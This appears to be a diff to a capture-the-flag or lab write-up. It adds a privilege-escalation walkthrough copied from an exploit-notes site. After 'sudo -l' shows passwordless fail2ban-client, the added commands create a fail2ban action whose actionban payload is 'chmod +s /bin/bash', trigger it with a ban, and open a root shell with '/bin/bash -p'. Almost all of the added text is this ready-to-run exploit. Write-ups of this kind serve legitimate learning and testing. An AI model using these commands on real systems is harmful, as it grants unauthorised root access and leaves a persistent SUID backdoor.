@@ -72,8 +72,29 @@ lets exploit these service !!!!!!!!!!
 
 we found a exploit on https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/fail2ban-command/
 
+# Investigation
 
+sudo -l
 
+# Output:
 
+(ALL) NOPASSWD: /usr/bin/fail2ban-client
+
+**If we can execute fail2ban-client command as root, we may be able to escalate privilege and gain a root shell.**
+
+# Exploit
+
+# Get jail list
+sudo /usr/bin/fail2ban-client status
+# Choose one of the jails from the "Jail list" in the output.
+sudo /usr/bin/fail2ban-client get <JAIL> actions
+# Create a new action with arbitrary name (e.g. "evil")
+sudo /usr/bin/fail2ban-client set <JAIL> addaction evil
+# Set payload to actionban
+sudo /usr/bin/fail2ban-client set <JAIL> action evil actionban "chmod +s /bin/bash"
+# Trigger the action
+sudo /usr/bin/fail2ban-client set <JAIL> banip 1.2.3.5
+# Now we gain a root
+/bin/bash -p
 
 
